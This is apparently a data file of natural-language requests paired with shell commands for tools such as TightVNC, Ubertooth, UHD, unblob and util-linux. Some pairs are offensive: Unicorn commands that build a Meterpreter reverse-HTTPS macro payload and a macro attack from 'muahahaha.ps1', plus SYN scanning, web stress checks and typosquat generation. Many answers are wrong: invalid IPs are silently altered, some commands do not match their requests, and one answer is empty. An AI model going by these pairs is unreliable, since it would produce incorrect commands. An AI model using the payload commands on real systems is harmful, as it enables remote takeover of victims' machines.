{"input": "Launch a TightVNC server with a pixel format of RGB565 and a screen resolution of 800x600", "answer": "tightvncserver -pixelformat rgb565 -geometry 800x600"}
{"input": "Start a TightVNC server with a desktop name \"TestServer\", a screen resolution of 1024x768, and a pixel format of BGR233", "answer": "tightvncserver -name TestServer -geometry 1024x768 -pixelformat bgr233"}
{"input": "Kill the TightVNC server running on display number 2", "answer": "tightvncserver -kill :2"}
{"input": "Connect to a VNC server at IP 192.168.1.100 using a shared connection and full-screen mode", "answer": "xtightvncviewer -shared -fullscreen 192.168.1.100"}
{"input": "Connect to a VNC server at IP 10.0.0.5 on port 5901, using a private colormap and disabling JPEG compression", "answer": "xtightvncviewer -owncmap -nojpeg 10.0.0.5::5901"}
{"input": "Connect to a VNC server at IP 192.168.2.200 with view-only mode enabled and a compression level of 5", "answer": "xtightvncviewer -viewonly -compresslevel 5 192.168.2.200"}
{"input": "Connect to a VNC server at IP 192.168.4.30 with BGR233 color format and disable raising the window on beep events", "answer": "xtightvncviewer -bgr233 -noraiseonbeep 192.168.4.30"}
{"input": "Connect to a VNC server at IP 10.0.0.100 with a custom encoding order of \"tight raw\" and a compression level of 3", "answer": "xtightvncviewer -encodings \"tight raw\" -compresslevel 3 10.0.0.100"}
{"input": "Connect to a VNC server at IP 192.168.5.60 with a shared connection and disable remote cursor shape updates", "answer": "xtightvncviewer -shared -nocursorshape 192.168.5.60"}
{"input": "Connect to a VNC server at IP 172.16.1.200 with a TrueColor visual and a depth of 16 bits per pixel", "answer": "xtightvncviewer -truecolor -depth 16 172.16.1.200"}
{"input": "Connect to a VNC server at IP 192.168.7.80 with a private colormap and disable raising the window on beep events", "answer": "xtightvncviewer -owncmap -noraiseonbeep 192.168.7.80"}
{"input": "Connect to a VNC server at IP 10.0.0.250 with a TrueColor visual and a custom encoding order of \"raw zlib\"", "answer": "xtightvncviewer -truecolor -encodings \"raw zlib\" 10.0.0.250"}
{"input": "Connect to a VNC server at IP 192.168.8.90 with a shared connection and disable JPEG compression", "answer": "xtightvncviewer -shared -nojpeg 192.168.8.90"}
{"input": "Connect to a VNC server at IP 192.168.9.100 with a TrueColor visual and disable remote cursor shape updates", "answer": "xtightvncviewer -truecolor -nocursorshape 192.168.9.100"}
{"input": "Connect to a VNC server at IP 10.0.0.350 with a shared connection and disable raising the window on beep events", "answer": "xtightvncviewer -shared -noraiseonbeep 10.0.0.35"}
{"input": "Connect to a VNC server at IP 192.168.10.110 with a private colormap and a custom encoding order of \"tight hextile\"", "answer": "xtightvncviewer -owncmap -encodings \"tight hextile\" 192.168.10.110"}
{"input": "Connect to a VNC server at IP 10.0.0.450 with a custom encoding order of \"zlib raw\" and disable JPEG compression", "answer": "xtightvncviewer -encodings \"zlib raw\" -nojpeg 10.0.0.45"}
{"input": "Connect to a VNC server at IP 192.168.12.130 with a TrueColor visual and disable raising the window on beep events", "answer": "xtightvncviewer -truecolor -noraiseonbeep 192.168.12.130"}
{"input": "Connect to a VNC server at IP 10.0.0.500 with a shared connection and a compression level of 4", "answer": "xtightvncviewer -shared -compresslevel 4 10.0.0.50"}
{"input": "Connect to a VNC server at IP 192.168.13.140 with a private colormap and disable remote cursor shape updates", "answer": "xtightvncviewer -owncmap -nocursorshape 192.168.13.140"}
{"input": "Connect to a VNC server at IP 10.0.0.550 with a TrueColor visual and a custom encoding order of \"tight zlib\"", "answer": "xtightvncviewer -truecolor -encodings \"tight zlib\" 10.0.0.55"}
{"input": "Connect to a VNC server at IP 192.168.14.150 with a shared connection and disable JPEG compression", "answer": "xtightvncviewer -shared -nojpeg 192.168.14.150"}
{"input": "Connect to a VNC server at IP 192.168.15.160 with a private colormap and disable raising the window on beep events", "answer": "xtightvncviewer -owncmap -noraiseonbeep 192.168.15.160"}
{"input": "Connect to a VNC server at IP 192.168.16.170 with a TrueColor visual and disable remote cursor shape updates", "answer": "xtightvncviewer -truecolor -nocursorshape 192.168.16.170"}
{"input": "Connect to a VNC server at IP 10.0.0.750 with a TrueColor visual and a depth of 16 bits per pixel", "answer": "xtightvncviewer -truecolor -depth 16 10.0.0.75"}
{"input": "Connect to a VNC server at IP 192.168.18.190 with a private colormap and disable raising the window on beep events", "answer": "xtightvncviewer -owncmap -noraiseonbeep 192.168.18.190"}
{"input": "Connect to a VNC server at IP 192.168.19.200 with a TrueColor visual and disable remote cursor shape updates", "answer": "xtightvncviewer -truecolor -nocursorshape 192.168.19.200"}
{"input": "Start a new tmux session with a custom socket name \"my_session\"", "answer": "tmux -L my_session new"}
{"input": "Start a new tmux session with a custom configuration file located at \"~/.tmux.conf.custom\"", "answer": "tmux -f ~/.tmux.conf.custom new"}
{"input": "Retrieve the version information from the Oracle TNS listener at IP 10.10.10.50 on port 1522", "answer": "tnscmd10g version -h 10.10.10.50 -p 1522"}
{"input": "Send a custom raw command to the Oracle TNS listener at IP 192.168.5.10 and ensure it works against Oracle 10G", "answer": "tnscmd10g --rawcmd \"CUSTOM_COMMAND\" -h 192.168.5.10 --10G"}
{"input": "Send a custom raw command \"TEST_COMMAND\" to the Oracle TNS listener at IP 10.10.20.30 on port 1525 and log the raw packets to a file named `custom_cmd.log`", "answer": "tnscmd10g --rawcmd \"TEST_COMMAND\" -h 10.10.20.30 -p 1525 --logfile custom_cmd.log"}
{"input": "Perform a traceroute to the host 172.16.0.1 with a start TTL of 3, using UDP probes, and set the wait time to 1 second", "answer": "traceroute -f 3 -U -w 1 172.16.0.1"}
{"input": "Scan a root filesystem located at `/mnt/rootfs` for vulnerabilities using Trivy", "answer": "trivy rootfs /mnt/rootfs"}
{"input": "Enable IPv6 mode in tundeep, bind to the interface `eth1`, and connect to the IPv6 address `2001:db8::1` on port `443` in client mode", "answer": "tundeep -6 -i eth1 -h 2001:db8::1 -p 443 -c"}
{"input": "Use tundeep to bind to the interface `eth2`, connect to the IP `172.16.0.5` on port `9000` in client mode, and disable checksum validation", "answer": "tundeep -i eth2 -h 172.16.0.5 -p 9000 -c -K"}
{"input": "Enable compression mode in tundeep, bind to the interface `eth4`, and connect to the IP `192.168.4.10` on port `7000` in client mode", "answer": "tundeep -C -i eth4 -h 192.168.4.10 -p 7000 -c"}
{"input": "Detect the AFH channel map for a piconet with UAP 44 and LAP 556677, and set a timeout of 10 seconds for initial detection", "answer": "ubertooth-afh -u 44 -l 556677 -t 10"}
{"input": "Detect the AFH channel map for a piconet with UAP 66 and LAP 990011, and use Ubertooth device number 3", "answer": "ubertooth-afh -u 66 -l 990011 -U 3"}
{"input": "Capture Bluetooth Low Energy advertisements without following connections and save the output to a PCAPNG file named `ble_ads.pcapng`", "answer": "ubertooth-btle -n -r ble_ads.pcapng"}
{"input": "Use Ubertooth-debug to read CC2400 register 0x30 and set the verbosity level to 2 for detailed output", "answer": "ubertooth-debug -r 0x30 -v2"}
{"input": "Reset the Ubertooth device after performing a firmware update using the file `latest_firmware.dfu`", "answer": "ubertooth-dfu -d latest_firmware.dfu -r"}
{"input": "Add a DFU suffix to the binary file `experimental_firmware.bin` and save the result as `experimental_firmware.dfu`", "answer": "mv experimental_firmware.bin experimental_firmware.dfu"}
{"input": "Follow a Bluetooth device with LAP 0xABCDEF and UAP 0x04 using ubertooth-follow, and enable Adaptive Frequency Hopping (AFH)", "answer": "ubertooth-follow -lABCDEF -u04 -a"}
{"input": "Use ubertooth-follow to follow a Bluetooth device with LAP 0x778899 and UAP 0x07, and specify the use of Ubertooth device number 3", "answer": "ubertooth-follow -l778899 -u07 -U 3"}
{"input": "Use Ubertooth to scan for Bluetooth devices on the default Bluetooth interface (hci0) with a maximum of 1 access code error allowed", "answer": "ubertooth-scan"}
{"input": "Analyze the spectrum between 2400 MHz and 2450 MHz using Ubertooth.\"", "answer": "ubertooth-specan -l 2400 -u 2450"}
{"input": "Use Ubertooth to visualize the 2.4 GHz ISM band and detect any overlapping signals", "answer": "ubertooth-specan-ui"}
{"input": "How do I activate In-System Programming (ISP) mode on my Ubertooth device?", "answer": "ubertooth-util -i"}
{"input": "How can I get the hardware board ID number of my Ubertooth device?", "answer": "ubertooth-util -b"}
{"input": "How do I set the Ubertooth device to use device number 3?", "answer": "ubertooth-util -U3"}
{"input": "Build an RFNoC image using a YAML configuration file located at `/home/user/config.yml`, targeting the X310 device, and save the Vivado project to disk", "answer": "rfnoc_image_builder -y /home/user/config.yml -d x310 -s"}
{"input": "Generate a secure RFNoC image core using a YAML configuration file at `/home/user/config.yml`, with the encryption key located at `/home/user/key.txt`, and name the secure core `secure_core.yml`", "answer": "rfnoc_image_builder -y /home/user/config.yml -S secure_core.yml -K /home/user/key.txt"}
{"input": "Build an RFNoC image for the E320 device using a YAML configuration file at `/home/user/config.yml`, open the Vivado GUI during the build process, and use 4 parallel jobs for the build", "answer": "rfnoc_image_builder -y /home/user/config.yml -d e320 -g -j 4"}
{"input": "Build an RFNoC image for the X410 device using a YAML configuration file at `/home/user/config.yml`, and do not include the source YAML hash or date in the generated source code", "answer": "rfnoc_image_builder -y /home/user/config.yml -d x410 -H -D"}
{"input": "Build an RFNoC image for the N320 device using a YAML configuration file at `/home/user/config.yml`, and specify the build output directory as `/home/user/fpga_build`", "answer": "rfnoc_image_builder -y /home/user/config.yml -d n320 -O /home/user/fpga_build"}
{"input": "Build an RFNoC image for the X300 device using a YAML configuration file at `/home/user/config.yml`, and specify the build IP directory as `/home/user/ip_build`", "answer": "rfnoc_image_builder -y /home/user/config.yml -d x300 -E /home/user/ip_build"}
{"input": "Perform a self-calibration on the UHD device with the device arguments \"type=x300,addr=192.168.10.20\"", "answer": "uhd_adc_self_cal --args \"type=x300,addr=192.168.10.20\""}
{"input": "Execute the UHD ADC self-calibration tool with the device address \"addr=10.0.0.1\" and ensure the calibration process is completed", "answer": "uhd_adc_self_cal --args \"addr=10.0.0.1\""}
{"input": "Generate an RX IQ balance calibration table for a UHD device with a specific subdevice 'B', a transmit wave amplitude of 0.5, and a TX LO offset of 1 MHz", "answer": "uhd_cal_rx_iq_balance --subdev B --tx_wave_ampl 0.5 --tx_offset 1000000"}
{"input": "Generate an RX IQ balance calibration table for a UHD device with a frequency sweep starting at 900 MHz, ending at 1 GHz, and a step size of 5 MHz", "answer": "uhd_cal_rx_iq_balance --freq_start 900000000 --freq_stop 1000000000 --freq_step 5000000"}
{"input": "Generate an RX IQ balance calibration table for a UHD device with a frequency sweep starting at 2.4 GHz, ending at 2.5 GHz, a step size of 10 MHz, and a transmit wave amplitude of 0.8", "answer": "uhd_cal_rx_iq_balance --freq_start 2400000000 --freq_stop 2500000000 --freq_step 10000000 --tx_wave_ampl 0.8"}
{"input": "Generate an RX IQ balance calibration table for a UHD device with a TX LO offset of 500 kHz, a correction precision of 0.0005, and verbose output enabled", "answer": "uhd_cal_rx_iq_balance --tx_offset 500000 --precision 0.0005 --verbose"}
{"input": "Generate an RX IQ balance calibration table for a UHD device with a specific subdevice 'A', a frequency sweep starting at 1 GHz, ending at 1.1 GHz, and a step size of 1 MHz", "answer": "uhd_cal_rx_iq_balance --subdev A --freq_start 1000000000 --freq_stop 1100000000 --freq_step 1000000"}
{"input": "Generate an RX IQ balance calibration table for a UHD device with a transmit wave amplitude of 0.6, a TX LO offset of 2 MHz, and 5000 samples per data capture", "answer": "uhd_cal_rx_iq_balance --tx_wave_ampl 0.6 --tx_offset 2000000 --nsamps 5000"}
{"input": "Generate an RX IQ balance calibration table for a UHD device with a specific device address 'type=x300', a frequency sweep starting at 3 GHz, ending at 3.1 GHz, and a step size of 2 MHz", "answer": "uhd_cal_rx_iq_balance --args \"type=x300\" --freq_start 3000000000 --freq_stop 3100000000 --freq_step 2000000"}
{"input": "Generate an RX IQ balance calibration table for a UHD device with a correction precision of 0.00001, verbose output enabled, and a TX LO offset of 1.5 MHz", "answer": "uhd_cal_rx_iq_balance --precision 0.00001 --verbose --tx_offset 1500000"}
{"input": "Generate a TX DC Offset Calibration Table for a UHD device connected at address `192.168.10.2`, using subdevice `B`, and a transmit wave frequency of 1 MHz", "answer": "uhd_cal_tx_dc_offset --args \"addr=192.168.10.2\" --subdev B --tx_wave_freq 1000000"}
{"input": "Perform a TX DC Offset Calibration for a UHD device with a transmit wave amplitude of 0.5, an RX LO offset of 1 MHz, and a frequency sweep from 900 MHz to 1 GHz with a step size of 5 MHz", "answer": "uhd_cal_tx_dc_offset --tx_wave_ampl 0.5 --rx_offset 1000000 --freq_start 900000000 --freq_stop 1000000000 --freq_step 5000000"}
{"input": "Perform a TX DC Offset Calibration for a UHD device connected at address `192.168.1.100`, using subdevice `A`, a transmit wave frequency of 2 MHz, and a transmit wave amplitude of 0.7", "answer": "uhd_cal_tx_dc_offset --args \"addr=192.168.1.100\" --subdev A --tx_wave_freq 2000000 --tx_wave_ampl 0.7"}
{"input": "Generate a TX DC Offset Calibration Table for a UHD device with a frequency sweep from 800 MHz to 1.2 GHz, a step size of 10 MHz, and verbose logging enabled", "answer": "uhd_cal_tx_dc_offset --freq_start 800000000 --freq_stop 1200000000 --freq_step 10000000 --verbose"}
{"input": "Generate a TX IQ Balance Calibration Table for a UHD device with a specific subdevice 'B', a transmit wave frequency of 1 MHz, and a transmit wave amplitude of 0.5", "answer": "uhd_cal_tx_iq_balance --subdev B --tx_wave_freq 1000000 --tx_wave_ampl 0.5"}
{"input": "Generate a TX IQ Balance Calibration Table for a UHD device with a frequency sweep starting at 900 MHz, stopping at 1 GHz, and stepping every 5 MHz", "answer": "uhd_cal_tx_iq_balance --freq_start 900000000 --freq_stop 1000000000 --freq_step 5000000"}
{"input": "Generate a TX IQ Balance Calibration Table for a UHD device with a specific device address 'type=b200', using 10000 samples per data capture", "answer": "uhd_cal_tx_iq_balance --args \"type=b200\" --nsamps 10000"}
{"input": "Generate a TX IQ Balance Calibration Table for a UHD device with a transmit wave frequency of 2.4 GHz, an amplitude of 0.7, and a frequency step size of 10 MHz", "answer": "uhd_cal_tx_iq_balance --tx_wave_freq 2400000000 --tx_wave_ampl 0.7 --freq_step 10000000"}
{"input": "Generate a TX IQ Balance Calibration Table for a UHD device with a frequency sweep from 800 MHz to 1.2 GHz, stepping every 2 MHz, and using a precision of 0.00001", "answer": "uhd_cal_tx_iq_balance --freq_start 800000000 --freq_stop 1200000000 --freq_step 2000000 --precision 0.00001"}
{"input": "Generate a TX IQ Balance Calibration Table for a UHD device with a custom RX LO offset of 500 kHz, a transmit wave frequency of 1.5 GHz, and verbose logging enabled", "answer": "uhd_cal_tx_iq_balance --rx_offset 500000 --tx_wave_freq 1500000000 --verbose"}
{"input": "Generate a TX IQ Balance Calibration Table for a UHD device with a frequency sweep from 500 MHz to 600 MHz, stepping every 1 MHz, and using 5000 samples per data capture", "answer": "uhd_cal_tx_iq_balance --freq_start 500000000 --freq_stop 600000000 --freq_step 1000000 --nsamps 5000"}
{"input": "Which components were enabled at build time for the USRP Hardware Driver (UHD)?", "answer": "uhd_config_info --enabled-components"}
{"input": "What is the installation prefix for the USRP Hardware Driver (UHD)?", "answer": "uhd_config_info --install-prefix"}
{"input": "What is the ABI version string for the USRP Hardware Driver (UHD)?", "answer": "uhd_config_info --abi-version"}
{"input": "Load a custom FPGA image from `/home/user/custom_fpga.bit` onto an Ettus Research device without burning the firmware", "answer": "uhd_image_loader --fpga-path /home/user/custom_fpga.bit --no-fw"}
{"input": "Load both firmware and FPGA images onto an Ettus Research device located at `192.168.1.200` using custom paths for both images", "answer": "uhd_image_loader --args \"addr=192.168.1.200\" --fw-path /home/user/custom_fw.bin --fpga-path /home/user/custom_fpga.bit"}
{"input": "Download all image packages for USRP devices, using a custom base URL `https://example.com/images/` for the download location", "answer": "uhd_images_downloader --types \".*\" --base-url https://example.com/images/"}
{"input": "Burn both the firmware and FPGA images to the USRP N-Series device located at `/dev/sdb` using the provided image files `firmware.img` and `fpga.img`", "answer": "usrp2_card_burner --dev=/dev/sdb --fw=firmware.img --fpga=fpga.img"}
{"input": "Burn both the firmware image `firmware.img` and the FPGA image `fpga.img` to the USRP N-Series device located at `/dev/sde`, overriding any safety checks", "answer": "usrp2_card_burner --dev=/dev/sde --fw=firmware.img --fpga=fpga.img --force"}
{"input": "List all files in the archive `example.zip` with detailed information about each file", "answer": "lsar -l example.zip"}
{"input": "List the contents of the archive `archive.7z` in JSON format", "answer": "7z l archive.7z"}
{"input": "List the contents of the archive `files.rar` without including solid object information in the JSON output", "answer": "lsar -j files.rar"}
{"input": "Extract the contents of `files.rar` into the current directory, but do not create a containing directory for the extracted files", "answer": "unar -D files.rar"}
{"input": "Analyze the binary blob `data.blob` with a recursion depth of 5 and save the metadata report to `report.json`", "answer": "unblob -d 5 --report report.json data.blob"}
{"input": "Extract files from `data.bin` using 8 worker processes for parallel processing and save the extracted files to `extracted_files`", "answer": "unblob -p 8 -e extracted_files data.bin"}
{"input": "Extract files from `firmware.img` but skip processing files with the magic prefix \"PDF document\" and save the logs to `firmware_log.txt`", "answer": "unblob --skip-magic \"PDF document\" --log firmware_log.txt firmware.img"}
{"input": "Extract files from `firmware.bin` and load additional plugins from the directory `custom_plugins`", "answer": "unblob -P custom_plugins firmware.bin"}
{"input": "Extract files from `archive.img` and clear the default skip magic list before processing", "answer": "unblob --clear-skip-magics archive.img"}
{"input": "Extract files from `data.bin` and show the external dependencies required for unblob to work properly", "answer": "unblob --show-external-dependencies data.bin"}
{"input": "Extract files from `data.blob` with a recursion depth of 3 and save the logs to `data_log.txt`", "answer": "unblob -d 3 --log data_log.txt data.blob"}
{"input": "Use unhide-posix to check for hidden processes on the system", "answer": "unhide-posix proc"}
{"input": "Create a macro-based attack using Unicorn-Magic with a Meterpreter reverse HTTPS payload targeting IP 192.168.1.5 on port 443", "answer": "python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 macro"}
{"input": "Convert a harmless PowerShell script (`harmless.ps1`) into an encoded command using Unicorn-Magic", "answer": "python unicorn.py --encode harmless.ps1"}
{"input": "Generate a custom PowerShell script attack (`muahahaha.ps1`) with a macro option, using 500 characters per VBA string", "answer": "python unicorn.py muahahaha.ps1 macro 500"}
{"input": "Run FantaIP in verbose mode on the interface `eth0` targeting the IP address `192.168.1.10`", "answer": "fantaip -i eth0 -t 192.168.1.10 -v"}
{"input": "Analyze the packet capture file `data.pcap` and filter for UDP traffic on port 500, saving the results to `filtered_output.conf`", "answer": "tshark -r data.pcap -Y \"udp.port == 500\" -w filtered_output.pcap"}
{"input": "Analyze the packet capture file `capture.pcap` with verbose output and save the results to `results.conf`", "answer": "tshark -r capture.pcap -V > results.conf"}
{"input": "Analyze the packet capture file `logs.pcap` and save the results to `final_output.conf` while filtering for UDP traffic on port 53", "answer": "tshark -r logs.pcap -Y \"udp.port == 53\" -w final_output.conf"}
{"input": "Analyze the packet capture file `network.pcap` and filter for traffic on port 443", "answer": "tshark -r network.pcap -Y \"tcp.port == 443\""}
{"input": "Run a full configuration test on all available devices using the `unicfgtst` tool", "answer": ""}
{"input": "Perform a TCP SYN scan on the IP 192.168.1.100, scanning ports 1-1024, with a packet timeout of 10 seconds, and enable verbose output", "answer": "nmap -sS -p 1-1024 --host-timeout 10s -v 192.168.1.100"}
{"input": "Perform a comprehensive scan on the website `https://www.example.com/` including directory checks, file checks, robots.txt and sitemap.xml checks, dynamic checks, and static checks", "answer": "perl ./uniscan.pl -u https://www.example.com/ -qweds"}
{"input": "Use Uniscan to perform a Google search for URLs containing the word \"test\" and analyze the results", "answer": "perl ./uniscan.pl -g \"inurl:test\""}
{"input": "Perform a comprehensive scan on the website `https://www.example.com/` including directory checks, file checks, robots.txt and sitemap.xml checks, dynamic checks, static checks, and stress checks", "answer": "perl ./uniscan.pl -u https://www.example.com/ -qwedsr"}
{"input": "List all files in the archive `example.rar` with technical details", "answer": "unrar lt example.rar"}
{"input": "Extract all files from the archive `example.rar` and overwrite any existing files without prompting", "answer": "unrar e -o+ example.rar"}
{"input": "Extract all files from the archive `example.rar` and assume \"Yes\" to all prompts", "answer": "unrar e -y example.rar"}
{"input": "Extract all files from the archive `example.rar` and disable all messages", "answer": "unrar e -inul example.rar"}
{"input": "Extract all files from the archive `example.rar` and automatically rename files if a conflict occurs", "answer": "unrar e -or example.rar"}
{"input": "Extract all files from the archive `example.rar` and exclude files listed in `exclude_list.txt`", "answer": "unrar e -x@exclude_list.txt example.rar"}
{"input": "Compress the file \"program.exe\" and compress all icons except the first one", "answer": "upx-ucl --compress-icons=2 program.exe"}
{"input": "Generate all domain variations for \"example.io\" and include the DNS resolution status for each variation", "answer": "urlcrazy -k all --dns example.io"}
{"input": "Remove all columns starting from column 5 to the end of the line in the file \"data.txt\"", "answer": "colrm 5 < data.txt"}
{"input": "Remove all columns after column 10 from the standard input", "answer": "colrm 11"}
{"input": "Remove all columns after column 30 from a file named \"results.csv\"", "answer": "colrm 31 < results.csv"}
{"input": "Output the contents of \"config.cfg\" in canonical hex+ASCII format, interpreting only the first 128 bytes", "answer": "hd -C -n 128 config.cfg"}
{"input": "Display the contents of \"binary.dat\" in two-byte decimal format without squeezing identical lines", "answer": "hexdump -d -v binary.dat"}
{"input": "Display the contents of \"script.sh\" in one-byte character format, skipping the first 10 bytes", "answer": "hexdump -s 10 -c script.sh"}
{"input": "Underline the contents of the file \"report.txt\" without specifying any additional options", "answer": "ul report.txt"}
{"input": "Log a message with the tag \"myapp\" and priority \"user.notice\" to the system log", "answer": "logger -t myapp -p user.notice \"This is a test message from myapp\""}
{"input": "Log a message to the system log and also output it to the standard error stream", "answer": "logger -s \"This message will also appear in stderr\""}
{"input": "Log a message to the system log using the obsolete BSD syslog protocol", "answer": "logger --rfc3164 \"This message uses the BSD syslog protocol\""}
{"input": "Log a message to the system log and include the logger command's process ID", "answer": "logger -i \"This message includes the logger command's PID\""}
{"input": "Log a message to the system log using a specific Unix socket", "answer": "logger -u /dev/log \"This message is sent via a Unix socket\""}
{"input": "Change the priority of all processes owned by the user \"john\" to a nice value of 10", "answer": "renice -n 10 -u john"}
{"input": "Increase the priority of all processes in the process group with ID 1234 by 5", "answer": "renice --relative 5 -g 1234"}
{"input": "Increase the priority of all processes owned by the user \"alice\" by 2", "answer": "renice --relative 2 -u alice"}
{"input": "Decrease the priority of all processes in the process group with ID 5555 by 4", "answer": "renice --relative -4 -g 5555"}
{"input": "Record a terminal session and ensure the output file is flushed after each write", "answer": "script -f session_flush.log"}
{"input": "Replay a terminal session using the timing file `timing.log` and the typescript file `session.log`, and display the version of `scriptlive` being used", "answer": "scriptlive -t timing.log -I session.log -V"}
{"input": "Replay a terminal session using the timing file `timing.log` and the typescript file `session.log` with a speed divisor of 2 to slow down the playback", "answer": "scriptreplay -t timing.log -d 2 session.log"}
{"input": "Replay a terminal session using the timing file `timing.log` and the typescript file `session.log`, but speed up the playback by a factor of 4", "answer": "scriptreplay -t timing.log session.log 0.25"}
{"input": "Replay a terminal session using the timing file `timing.log` and the typescript file `session.log`, but wait no more than 1 second between updates", "answer": "scriptreplay -t timing.log session.log -m 1"}
{"input": "Replay a terminal session using the timing file `timing.log` and the typescript file `session.log`, but treat carriage returns as always being present", "answer": "scriptreplay -t timing.log session.log -C"}
{"input": "Replay a terminal session using the timing file `timing.log` and the typescript file `session.log`, but display the version of the `scriptreplay` tool before starting the playback", "answer": "scriptreplay --version && scriptreplay -t timing.log session.log"}
{"input": "Send a message to all users on the system informing them of a scheduled maintenance at 2 AM", "answer": "wall \"Scheduled maintenance will occur at 2 AM. Please save your work and log out by then.\""}
{"input": "List all partitions on /dev/sdg and output only the device name, start sector, and size", "answer": "lsblk -o NAME,START,SIZE /dev/sdg"}
{"input": "Change the partition type of partition 1 on `/dev/sde` to `Linux LVM` (type code `8e`)", "answer": "sfdisk --part-type /dev/sde 1 8e"}
{"input": "Suppress extra info messages while listing partitions on `/dev/sdn`", "answer": "sfdisk -l -q /dev/sdn"}
{"input": "Print the partition table of `/dev/sdp` in JSON format", "answer": "sfdisk -J /dev/sdp"}
{"input": "Use a custom lastlog2 database located at `/var/log/lastlog2_custom.db` to display last login records", "answer": "lastlog2 -d /var/log/lastlog2_custom.db"}
{"input": "Start a login session on the system for the user \"john\" without destroying the environment and log the hostname \"remotehost\" in the utmp and wtmp entries", "answer": "login -p -h remotehost john"}
{"input": "Switch to the group \"developers\" and execute the command \"ls -l\" in the new group context", "answer": "newgrp developers && ls -l"}
{"input": "Switch to the group \"testers\" and run a script located at \"/home/user/script.sh\" in the new group context", "answer": "newgrp testers -c \"/home/user/script.sh\""}
{"input": "Log in to the group \"backup\" and create a compressed archive of the \"/home/user/data\" directory", "answer": "newgrp backup && tar -czf /home/user/data.tar.gz /home/user/data"}
{"input": "Switch to the group \"web\" and start a Python HTTP server on port 8080", "answer": "newgrp web -c \"python3 -m http.server 8080\""}
{"input": "Log in to the group \"database\" and run the command \"mysql -u root -p\" to access the MySQL database", "answer": "sg database -c \"mysql -u root -p\""}
{"input": "Detach all loop devices that are currently in use", "answer": "losetup -D"}
{"input": "Print the name of the loop device after setting it up for the file `/mnt/data/disk.img`", "answer": "losetup -f --show /mnt/data/disk.img"}
{"input": "Disable the swap device with the label `swap1` and provide verbose output", "answer": "swapoff -v -L swap1"}
{"input": "Enable all swap devices and files listed in /etc/fstab, and display verbose output", "answer": "swapon -a -v"}
{"input": "Enable all swap devices and files listed in /etc/fstab, and reinitialize the swap space if necessary", "answer": "swapon -a -f"}
{"input": "Enable all swap devices and files listed in /etc/fstab, and enable swap discards with the default policy", "answer": "swapon -a -d"}
{"input": "Unmount all filesystems and perform a dry run without actually unmounting them", "answer": "umount -a --fake"}
{"input": "Show the raw output of all wireless devices, including all columns", "answer": "iw dev"}
{"input": "Open a terminal on `/dev/tty6` with a baud rate of 57600, enable hardware flow control, and wait 5 seconds before displaying the login prompt", "answer": "agetty -h --delay 5 /dev/tty6 57600"}
{"input": "Discard all sectors on the device `/dev/sdb` without performing any checks or warnings", "answer": "blkdiscard -f /dev/sdb"}
{"input": "Securely discard all sectors on the device `/dev/sdc` while suppressing warning messages", "answer": "blkdiscard -s -q /dev/sdc"}
{"input": "Discard all sectors on the device `/dev/sdh` with a length of 10 GiB from the start of the device", "answer": "blkdiscard -l 10GiB /dev/sdh"}
{"input": "Discard all sectors on the device `/dev/sdk` with a length of 5 GiB starting from an offset of 1 GiB", "answer": "blkdiscard -o 1GiB -l 5GiB /dev/sdk"}
{"input": "Display block device attributes for `/dev/sdc1` and `/dev/sdd1` in a value-only format", "answer": "blkid --output value /dev/sdc1 /dev/sdd1"}
{"input": "Filter and display only devices of type `ext4` or `xfs`", "answer": "blkid --match-types ext4,xfs"}
{"input": "Open a range of zones on `/dev/sdd` starting at sector 4096 and covering 512 sectors", "answer": "blkzone open --offset 4096 --length 512 /dev/sdd"}
{"input": "Close the first 10 zones on the block device `/dev/sde`", "answer": "blkzone close --count 10 /dev/sde"}
{"input": "Reset a range of zones on `/dev/sdh` starting at sector 10240 and covering 2048 sectors, displaying verbose output", "answer": "blkzone reset --offset 10240 --length 2048 --verbose /dev/sdh"}
{"input": "Close a range of zones on `/dev/sdj` starting at sector 5120 and covering 1024 sectors, displaying verbose output", "answer": "blkzone close --offset 5120 --length 1024 --verbose /dev/sdj"}
{"input": "Enable all CPUs and then trigger a rescan using `chcpu`", "answer": "chcpu -e all && chcpu -r"}
{"input": "Launch a new process running `/usr/bin/myapp` with an initial OOM-killer score adjustment of -100", "answer": "choom -n -100 -- /usr/bin/myapp"}
{"input": "Launch a new process running `/usr/bin/memtest` with no OOM-killer score adjustment", "answer": "/usr/bin/memtest"}
{"input": "Display all kernel messages in a human-readable format", "answer": "dmesg -H"}
{"input": "Display kernel messages with a time delta between each message", "answer": "dmesg -d"}
{"input": "Display kernel messages and decode the facility and level to readable strings", "answer": "dmesg -x"}
{"input": "Preallocate 2 TiB of space to the file `largefile.dat` using the POSIX-compliant method", "answer": "dd if=/dev/zero of=largefile.dat bs=1 count=0 seek=2T"}
{"input": "Use `findfs` to find the filesystem with the partition UUID \"a1b2c3d4-e5f6-7890-1234-567890abcdef\"", "answer": "findfs PARTUUID=a1b2c3d4-e5f6-7890-1234-567890abcdef"}
{"input": "Find the filesystem with the partition label \"BACKUP_DISK\" using `findfs`", "answer": "findfs PARTLABEL=BACKUP_DISK"}
{"input": "Find the filesystem with the label \"ROOT_FS\" and verify its device path", "answer": "findfs LABEL=ROOT_FS"}
{"input": "Locate the filesystem with the UUID \"98765432-10ab-cdef-1234-567890abcdef\" and confirm its device path", "answer": "findfs UUID=98765432-10ab-cdef-1234-567890abcdef"}
{"input": "Find the filesystem with the partition label \"SWAP_PARTITION\" using `findfs`", "answer": "findfs PARTLABEL=SWAP_PARTITION"}
{"input": "Show all mounted filesystems, including pseudo-filesystems, without any filters", "answer": "findmnt --all"}
{"input": "Display all mounted filesystems in a tree format, including pseudo-filesystems", "answer": "findmnt --all --tree"}
{"input": "Display all mounted filesystems, including pseudo-filesystems, in a list format without column headings", "answer": "findmnt --all --list --noheadings"}
{"input": "Show all mounted filesystems, including pseudo-filesystems, and print sizes in bytes", "answer": "findmnt --all --bytes"}
{"input": "Display all mounted filesystems, including pseudo-filesystems, and canonicalize the printed paths", "answer": "findmnt --all --canonicalize"}
{"input": "Display all mounted filesystems, including pseudo-filesystems, and print only those that are over-mounted by another filesystem", "answer": "findmnt --all --shadowed"}
{"input": "Apply a shared lock on the file `/var/log/boot.log`, wait up to 3 seconds for the lock, and increase verbosity", "answer": "flock -s -w 3 --verbose /var/log/boot.log -c \"echo 'Lock acquired'\""}
{"input": "Check and repair all filesystems on the system", "answer": "fsck -A"}
{"input": "Check all filesystems but do not execute any repairs; just show what would be done", "answer": "fsck -AN"}
{"input": "Check all filesystems, serialize the operations, and lock the device to ensure exclusive access", "answer": "fsck -Asl"}
